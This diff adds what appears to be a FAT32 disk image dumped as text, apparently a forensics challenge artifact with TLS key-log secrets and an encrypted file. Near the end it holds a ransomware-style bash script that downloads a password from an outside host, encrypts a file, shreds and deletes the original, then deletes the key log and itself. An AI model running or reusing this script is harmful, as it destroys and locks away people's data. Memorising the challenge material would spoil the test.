@@ -1,0 +1,96 @@
+GNU Parted Loopback 0
+bNO NAME    FAT32
+This is not a bootable disk.  Please insert a bootable floppy and
+press any key to try again ...
+RRaA
+rrAa
+mkfs.fat
+bNO NAME    FAT32
+This is not a bootable disk.  Please insert a bootable floppy and
+press any key to try again ...
+RRaA
+rrAa
+mkfs.fat
+NO NAME    FAT32
+This is not a bootable disk.  Please insert a bootable floppy and
+press any key to try again ...
+RRaA
+rrAa
+mkfs.fat
+NO NAME    FAT32
+This is not a bootable disk.  Please insert a bootable floppy and
+press any key to try again ...
+RRaA
+rrAa
+ECRET
+;8Y8Y
+ANSOM~1SH
+>8Y8Y
+8:8Y
+SLKEY~1
+>8Y8Y
+SECRET~1ENC
+>8Y8Y
+l4B1Ly
+k9vr
+ob@T
+@:ugr
+Fara_
+hDN2
+IvgM5(
+$?%dvoqy
+}tKy
+llhd
+sF"5C
+E|0g
+MQzV
+41xc
+Cb6g
+"3R}T
+IxmzP
+9So<
+x	A_
+c}nDo\
+~,es
+1zvA
+Iq^s
+~1>=#B5
+i_W*
+W&*|
+GhR^
+R9:,
+qnyb;
+e(O)
+w7h0B7
+4=c\
+s%K3
+~{yE-
+@mdI
+C ys&
+!6@A%
+9o!Ng
+Kq|H
+,w'@?{
+dg(r
+iA8z
+X{"G-
+URMX
+6`{.
+/8178E
+IYzE
+	La#
+R,aR
+pZ?KE
+#!/bin/bash
+password=$(SSLKEYLOGFILE=sslkeylogfile curl --insecure https://whatyoulookingat.com/1.txt)
+openssl enc -aes-128-cbc -pass pass:$password -in secret -out secret.encrypted
+shred secret
+rm secret
+rm sslkeylogfile
+rm $0
+SERVER_HANDSHAKE_TRAFFIC_SECRET cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 c9275180cf4e5bcdd6835e02459d453d47420201b92ed20ed507e278d2c9616778fa573479bd8ec3b1fad7e74dcf27f7
+EXPORTER_SECRET cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 1c375d3b154029a9c7d9ff5b4f7f07b75ba9751570c454423cc6d21c53a27e504d3e193d3e087a6e1feb7c31383e637d
+SERVER_TRAFFIC_SECRET_0 cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 ba5519d408d2cc9c285781eec7c2951bfbf069609b57b18906754624e0628820ed1888d0f22b770325c872b5f1f5bee3
+CLIENT_HANDSHAKE_TRAFFIC_SECRET cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 c85ae912b5caf1eb39452864e582c083a39f4ad89f27608aff7bb3287edb85b002111af149480f28e0c60e543075dd7b
+CLIENT_TRAFFIC_SECRET_0 cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 3a6be8bc746c002fe02a76da433307d5787bf230b9d0c2ee9ab776a17459fd2f037e8bee0a1b26b759e1ba02879ae920
+Salted__
